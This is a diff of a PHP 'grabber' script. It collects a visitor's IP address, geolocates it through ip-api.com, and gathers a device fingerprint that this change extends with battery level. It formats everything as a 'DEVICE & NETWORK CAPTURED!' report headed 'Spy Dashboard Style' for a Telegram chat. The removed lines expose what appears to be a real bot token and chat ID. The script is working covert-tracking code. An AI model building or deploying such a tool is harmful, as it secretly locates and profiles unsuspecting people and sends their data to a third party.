@@ -1,9 +1,9 @@
 <?php
 // ******************************************
-// CONFIGURATION: PASTE YOUR DETAILS BACK HERE
+// CONFIGURATION: PASTE YOUR REAL DETAILS HERE
 // ******************************************
-$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
-$chatId = "-1003598938463";
+$botToken = "YOUR_BOT_TOKEN_HERE"; // Paste your 8386... token here
+$chatId = "YOUR_CHAT_ID_HERE";     // Paste your -100... ID here
 // ******************************************
 
 // Receive Data
@@ -16,6 +16,8 @@ $ven = $_POST['Ven'];
 $ren = $_POST['Ren'];
 $ht = $_POST['Ht'];
 $wd = $_POST['Wd'];
+// NEW: Receive Battery Level
+$bat = $_POST['Bat'] ?? "Unknown"; 
 
 // Get Real IP (Cloudflare support included)
 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
@@ -24,8 +26,7 @@ if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
     $ip = $_SERVER['REMOTE_ADDR'];
 }
 
-// --- NEW: IP INTELLIGENCE LOOKUP (The Upgrade) ---
-// This asks a public database for the city/isp of the IP
+// --- IP INTELLIGENCE LOOKUP ---
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $city = $details->city ?? "Unknown";
 $region = $details->regionName ?? "Unknown";
@@ -33,10 +34,10 @@ $country = $details->country ?? "Unknown";
 $isp = $details->isp ?? "Unknown";
 // -------------------------------------------------
 
-// Format Message (Professional Dashboard Style)
+// Format Message (Spy Dashboard Style)
 $message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";
 
-// Section 1: Network / Location (The new stuff)
+// Section 1: Network / Location
 $message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
 $message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
 $message .= "├ <b>City:</b> " . $city . "\n";
@@ -47,8 +48,9 @@ $message .= "└ <b>ISP:</b> " . $isp . "\n\n";
 $message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
 $message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
 $message .= "├ <b>Browser:</b> " . $brw . "\n";
-$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
+$message .= "├ <b>Battery:</b> " . $bat . "\n"; // <--- NEW BATTERY DATA
 $message .= "├ <b>RAM:</b> " . $ram . " GB\n";
+$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
 $message .= "├ <b>Cores:</b> " . $cc . "\n";
 $message .= "└ <b>GPU:</b> " . $ven . " (" . $ren . ")\n";
 
